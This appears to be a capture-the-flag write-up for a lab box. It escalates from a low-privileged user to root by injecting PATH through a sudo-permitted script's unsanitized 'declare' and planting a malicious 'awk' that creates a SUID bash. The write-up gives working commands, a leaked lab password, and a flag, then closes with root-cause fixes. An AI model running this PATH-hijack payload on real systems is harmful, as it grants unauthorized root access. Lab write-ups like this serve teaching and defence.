# Yuan 113 — Writeup

**Difficulty:** Easy
**Category:** Privilege Escalation / PATH Hijacking

## Summary

This box involves escalating from a low-privileged `welcome` user to `root` by abusing a `sudo`-permitted script (`/opt/113.sh`) that allows arbitrary environment variable injection via `declare`. Specifically, overwriting the `PATH` variable causes a downstream script to call system utilities (`md5sum`, `awk`) from an attacker-controlled directory instead of their real locations, leading to arbitrary code execution as root.

## Recon

Initial `nmap` scan revealed only SNMP open:

```
PORT    STATE SERVICE
161/udp open  snmp
```

Enumerated SNMP with Metasploit:

```
use auxiliary/scanner/snmp/snmp_enum
```

Among the enumerated running processes/services, credentials for the `welcome` user were found embedded in process/service listing output:

```
service --user welcome --password mMOq2WWONQiiY8TinSRF --host localhost --port 8080
```

This provided initial access as `welcome`.

## Enumeration — sudo privileges

Checking `sudo -l` (or similar) revealed the `welcome` user could run `/opt/113.sh` as root. Its contents:

```bash
#!/bin/bash

sandbox=$(mktemp -d)
cd $sandbox

if [ "$#" -ne 3 ]; then
    exit
fi

if [ "$3" != "mazesec" ]; then
    echo "\$3 must be mazesec"
    exit
else
    /bin/cp /usr/bin/mazesec $sandbox
    exec_="$sandbox/mazesec"
fi

if [ "$1" = "exec_" ]; then
    exit
fi

declare -- "$1"="$2"
$exec_
```

Key observations:

- The script requires exactly 3 arguments, with the third **must** equal `mazesec`.
- It copies `/usr/bin/mazesec` into a temp sandbox and prepares to execute it.
- It blocks `$1` from literally being the string `exec_` (a weak guard against overwriting the `exec_` variable directly).
- Critically: `declare -- "$1"="$2"` lets the caller define **any arbitrary variable name** (`$1`) with **any arbitrary value** (`$2`) before the sandboxed `mazesec` binary is executed.

Checking `/usr/bin/mazesec`:

```bash
#!/bin/bash

flag=$(echo $RANDOM$RANDOM$RAMDOM$RANDOM | md5sum | awk '{print $1}')
echo "flag{fakeroot-$flag}"
```

This script calls `md5sum` and `awk` **without absolute paths**, relying entirely on `PATH` resolution.

## Vulnerability

Combining both findings:

1. `113.sh` lets us set `$1=PATH` and `$2=<attacker-controlled directory>` via `declare -- PATH="<dir>"`.
2. Although `declare` without `-x` normally does *not* export a variable, bash has a quirk: if the variable **already carries the export attribute** (as `PATH` always does, inherited from the shell environment), re-declaring it **retains** that export attribute. The modified `PATH` is therefore inherited by the child process (`$exec_`, i.e. `mazesec`).
3. When `mazesec` runs, it looks up `md5sum` and `awk` using the poisoned `PATH`, resolving them to attacker-controlled binaries instead of the real `/usr/bin/md5sum` and `/usr/bin/awk`.
4. Since the entire chain runs under `sudo` as root, the attacker-controlled binary executes **with root privileges**.

This is a classic **PATH hijacking privilege escalation** enabled by unsanitized variable name/value injection into `declare`.

## Exploitation

Restore a sane `PATH` for the current shell (needed because PATH may already be polluted during testing):

```bash
export PATH=/usr/bin:/bin:/usr/local/bin
```

Create an attacker-controlled directory and a malicious `awk` payload (using absolute paths inside the payload itself, since it will also execute under the hijacked `PATH`):

```bash
/bin/mkdir -p /tmp/evil

cat > /tmp/evil/awk << 'EOF'
#!/bin/bash
/bin/cp /bin/bash /tmp/rootbash
/bin/chmod u+s /tmp/rootbash
EOF

chmod +x /tmp/evil/awk
```

Trigger the vulnerable script, injecting the poisoned `PATH`:

```bash
sudo /opt/113.sh PATH /tmp/evil mazesec
```

`md5sum` fails ("command not found") since it wasn't planted, but the pipeline still continues and resolves `awk` to `/tmp/evil/awk`, which runs as root and creates a SUID copy of bash.

Verify:

```bash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root ... /tmp/rootbash
```

Spawn a root shell:

```bash
/tmp/rootbash -p
```

(`-p` preserves privileges — without it, bash would drop the effective UID back to the real UID on startup.)

## Flag

```
flag{root-9f283fe2f6363f99f80ed7f3f3c3cb19}
```

## Root Cause & Fix Recommendations

- **Root cause:** `declare -- "$1"="$2"` allows a caller to set an arbitrary environment variable (including sensitive ones like `PATH`, `LD_PRELOAD`, `IFS`, etc.) before invoking a privileged helper binary.
- **Fix:**
  - Never allow user input to define arbitrary variable names passed to `declare`/`export`.
  - Explicitly reset/sanitize `PATH` (and other sensitive env vars) at the top of any script invoked via `sudo`, e.g. `export PATH=/usr/bin:/bin`.
  - Use absolute paths for all command invocations inside privileged scripts (`/usr/bin/md5sum`, `/usr/bin/awk`), removing reliance on `PATH` resolution entirely.
  - Avoid granting `sudo` on scripts that accept unsanitized, attacker-controlled arguments used in variable assignment or command construction.
